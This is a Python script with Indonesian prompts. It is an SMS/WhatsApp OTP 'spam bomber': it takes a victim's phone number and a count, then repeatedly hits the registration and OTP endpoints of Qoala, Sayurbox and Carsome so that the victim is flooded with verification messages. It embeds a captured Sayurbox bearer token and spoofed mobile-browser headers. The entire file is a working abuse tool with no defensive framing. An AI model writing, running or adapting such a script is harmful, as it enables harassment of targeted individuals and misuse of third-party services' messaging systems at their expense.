import requests, json

k = 0
nomer = input("Masukan Nomer Target : ")
jumlah = int(input("Masukan Jumlah Spam : "))
# Ini headers
headers_qoala = {
'Host': 'api.qoalaplus.com',
'content-length': '48',
'accept': 'application/json, text/plain, */*',
'user-agent': 'Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36',
'content-type': 'application/json',
'origin': 'https://www.qoalaplus.com',
'sec-fetch-site': 'same-site',
'sec-fetch-mode': 'cors',
'sec-fetch-dest': 'empty',
'referer': 'https://www.qoalaplus.com/',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
headers_sayur = {
'Host': 'www.sayurbox.com',
'content-length': '289',
'authorization': 'eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNjY3NTM3OTE3LCJleHAiOjE2NzAxMjk5MTcsImlhdCI6MTY2NzUzNzkxNywiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGx9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6Ijc1ZTBlYzhjLWJkNDEtNGFjNy04OWFmLTdiMjkyOWRmYWIzNyIsInN1YiI6IjJFd2xtbjM1dHZ0ejdQZ1NQU05nSndkdEdSenoiLCJ1c2VyX2lkIjoiMkV3bG1uMzV0dnR6N1BnU1BTTmdKd2R0R1J6eiJ9.FeTawVAcqeWQSRoC6eki_jqwykO-uKuSSWzcEKC8dGJYfbXdwzTbK6gPvloXuI16RzH-jvtIiMghKwP4S6-M0JHwLI8feMA5UGIPQsnUiOR9LpqqV-2kybWvVNsU1DrsdHRbTyVZBFdwwwGVlqMGBM25gH30GAzDI7Hp6g-MvCwPH9KTC4xvD5vQkdJHFa9q42sxWDVz9TkzJ09fCgPX4ZdEONJ3c_63BvLwzVLb24t7ivjhcMJBkWvHNsZ5FsSxXyUB8sCGEA7ify4q2iV2cfnRklcTx2r20MFLOGsPBK0uGFUsbXdctJXC-WtM3jddwmDt0fX1CfToA0x4PL3Hhw',
'content-type': 'application/json',
'accept': '*/*',
'user-agent': 'Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36',
'x-bundle-revision': '14.2',
'x-sbox-tenant': 'sayurbox',
'x-binary-version': '2.4.1',
'origin': 'https://www.sayurbox.com',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-dest': 'empty',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
headers_carsome = {
'Host': 'www.carsome.id',
'content-length': '38',
'accept': 'application/json, text/plain, */*',
'x-language': 'id',
'x-token': '',
'country': 'ID',
'x-amplitude-device-id': 'QbOr1g4RMMMIpnkg7JVqx7',
'user-agent': 'Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36',
'content-type': 'application/json',
'origin': 'https://www.carsome.id',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-dest': 'empty',
'referer': 'https://www.carsome.id/',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
# Ini Data
data_qoala = json.dumps({"phone_number":"+62"+nomer,"channel":"WA"})
data_sayur = json.dumps([{"operationName":"generateOTP","variables":{"destinationType":"whatsapp","identity":"+62"+nomer},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"}])
data_carsome = json.dumps({"username":nomer,"optType":1})

for k in range(jumlah):
  k += 1
  pos_qoala = requests.post("https://api.qoalaplus.com/go-agent/v2/user/register",headers=headers_qoala,data=data_qoala).text
  if "success" in pos_qoala:
    print("Spam WhatsApp Qoala Berhasil Ke",k)
  else:
    print("Spam WhatsApp Qoala Gagal Ke",k)
for k in range(jumlah):
  k += 1
  pos_sayur = requests.post("https://www.sayurbox.com/graphql/v1?deduplicate=1",headers=headers_sayur,data=data_sayur).text
  if "__typename" in pos_sayur:
    print("Spam WhatsApp SayurBox Berhasil Ke",k)
  else:
    print("Spam WhatsApp SayurBox Gagal Ke",k)
for k in range(jumlah):
  k += 1
  pos_carsome = requests.post("https://www.carsome.id/website/login/sendSMS",headers=headers_carsome,data=data_carsome).text
  if "Send successfully" in pos_carsome:
    print("Spam WhatsApp Carsome Berhasil Ke",k)
  else:
    print("Spam WhatsApp Carsome Gagal Ke",k)
